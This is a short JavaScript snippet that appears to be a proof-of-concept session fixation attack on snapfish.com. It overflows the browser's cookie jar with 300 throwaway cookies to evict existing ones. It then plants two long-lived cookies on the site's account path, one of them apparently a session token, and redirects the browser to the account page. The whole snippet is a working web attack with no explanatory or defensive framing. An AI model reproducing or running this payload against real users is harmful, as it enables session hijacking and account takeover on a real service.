cookiejar_size = 300;

for (let i = 0; i < cookiejar_size; i++) 
    document.cookie = `cookie${i}=a; Secure; path=/`;

for (let i = 0; i < cookiejar_size; i++) 
    document.cookie = `cookie${i}=a; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/`;

const expires = new Date();
expires.setFullYear(expires.getFullYear() + 10);

document.cookie = `aus-3e856307-d8f1-418c-99ac-df7877bac3ef-90985; Domain=snapfish.com; Path=/youraccount; Expires=${expires.toUTCString()}`;
document.cookie = `sf_v1a%3BOOOLsH%2FIvKmfxUMZ8FqxjR8cPG6%2BG5%2BFzGj3nQbvw4MEWfXw9Qh3KtJ468DlS3fO7hqIrxCOrjXZMIJOPPt1jbDVOr2gzAAuH4Rzh8yJFA7tuEUogfKftl9OZgQPUUTvsm7HnqCFAwJdifmoq3wcUPSopwALPx6so5KKGpuJfNI%3DARrc29%2FfHk%2BGdQufASR5au2xD%2Fa2Y%2BhRjoVLeg1KXvXEfoQGLrKNyP3dugPRNNEpwQyQL8P5mkv8lzcMP9ho1CgUzTgVSWVO0cWZ9PVpQrMsRsE%2Fi%2FMMjkrxqWC6CEmEw1llX8mR9LBnsBQGl9cD%2BKLr%2B6XMPrOxxnvSQJ9dKWI%3D; Domain=snapfish.com; Path=/youraccount; Expires=${expires.toUTCString()}`;

window.location.href = "https://www.snapfish.com/youraccount";
